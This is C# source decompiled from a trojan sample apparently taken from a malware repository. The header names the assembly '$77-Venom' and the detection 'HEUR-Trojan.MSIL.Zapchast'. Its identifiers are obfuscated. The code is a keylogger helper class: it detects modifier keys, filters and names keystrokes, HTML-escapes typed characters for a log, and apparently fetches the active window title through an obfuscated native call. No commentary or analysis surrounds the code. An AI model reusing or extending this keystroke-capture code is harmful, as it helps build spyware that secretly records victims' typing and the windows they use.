// Decompiled with JetBrains decompiler
// Type: 拠�鸅蜧鰺佅걂⨶⣢䌶ู䌿��ﺛ邏�
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

public static class 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD
{
  public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
  {
    if (pressedKeys == null)
      return false;
    return pressedKeys.Contains(Keys.LControlKey) || pressedKeys.Contains(Keys.RControlKey) || pressedKeys.Contains(Keys.LMenu) || pressedKeys.Contains(Keys.RMenu) || pressedKeys.Contains(Keys.LWin) || pressedKeys.Contains(Keys.RWin) || pressedKeys.Contains(Keys.Control) || pressedKeys.Contains(Keys.Alt);
  }

  public static bool IsModifierKey(this Keys key) => key == Keys.LControlKey || key == Keys.RControlKey || key == Keys.LMenu || key == Keys.RMenu || key == Keys.LWin || key == Keys.RWin || key == Keys.Control || key == Keys.Alt;

  public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c) => pressedKeys.Contains((Keys) char.ToUpper(c));

  public static bool IsExcludedKey(this Keys k) => k >= Keys.A && k <= Keys.Z || k >= Keys.NumPad0 && k <= Keys.Divide || k >= Keys.D0 && k <= Keys.D9 || k >= Keys.OemSemicolon && k <= Keys.OemClear || k >= Keys.LShiftKey && k <= Keys.RShiftKey || k == Keys.Capital || k == Keys.Space;

  public static bool \uF542ᯠ峠෦笻槟먓\u09F4\u0FE9ⴰ\uF132Ὴ\u2469鴘พ\uF4A2屛齲簓僁(
    List<char> list,
    char search)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    return list.FindAll(new Predicate<char>(new 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD.焹䐰럄மϩ쿫\uF7B2廤\u25B9묮腇魟퉡ᝑ\uA7AE뫶\uEDA2\u28CE럮\uE0BA()
    {
      붶\u2858뾄\uF871\u21D9똒\uE08D\uEDBB\uE795믃䄀弲\uE751ꑨ\u02C4疯륲㗿鹗䕵 = search
    }.嬍\uF0BE禅\uEF40頭\uEB93㗾蚖霜젲ৰ랇睤ꄞ\u0CFA雛Ᏸ\uF5E5\u21DD昹)).Count > 1;
  }

  public static string 釈攽ژ眗ⱃ哤뻑\u2EAB\uFDD5\uFFFD\u19EB嫠钡\uE9CC舵\uEDD9㡪疵ﶏ\u26A0(char key)
  {
    if (key < ' ')
      return string.Empty;
    switch (key)
    {
      case ' ':
        return "&nbsp;";
      case '"':
        return "&quot;";
      case '#':
        return "&#35;";
      case '&':
        return "&amp;";
      case '\'':
        return "&apos;";
      case '<':
        return "&lt;";
      case '>':
        return "&gt;";
      default:
        return key.ToString();
    }
  }

  public static string \u2E02ꃃ뼤빏㼏啚떯㗽몰蟇㪸灲\uE1C6뫠䝾\uFFFD刉ﻴ뛪\uE911(string input) => input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;").Replace("'", "&apos;");

  public static string 縉薖ᩴ衪悚ạᮒ蕀霅敯쒜\uF1E0볯榮쯽ㅞꞰ鴵\u2A65툎(Keys key, bool altGr = false)
  {
    string str = key.ToString();
    if (str.Contains("ControlKey"))
      return "Control";
    if (str.Contains("Menu"))
      return "Alt";
    if (str.Contains("Win"))
      return "Win";
    return str.Contains("Shift") ? "Shift" : str;
  }

  public static string ꠕ约ꮰ딘鼗톗媭\uEA87೨\u2CE6\u2A93ﴺⴊ扨逰黝ᣏৗ듍\uE122()
  {
    StringBuilder lpString = new StringBuilder(1024);
    鈃嶼ࡋ\u2D69\uFFFD֯\u003E붓隍懞즱ꌨ뽌嬌㽬\u2361\u2B9E擮າࠐ.㓖ꅕ攡ྀ侮팊\u0AF3刧\uF64B炌櫦\uF8BFل\uE573푬幭挕ⷒ뙽꾖(鈃嶼ࡋ\u2D69\uFFFD֯\u003E붓隍懞즱ꌨ뽌嬌㽬\u2361\u2B9E擮າࠐ.匕\u0AA9裇\uEB13殔칡튳珈\u0C49㼬㝘鴑拱鍅힍쁷෯\u33C3霂좁(), lpString, lpString.Capacity);
    string str = lpString.ToString();
    return string.IsNullOrEmpty(str) ? (string) null : str;
  }
}
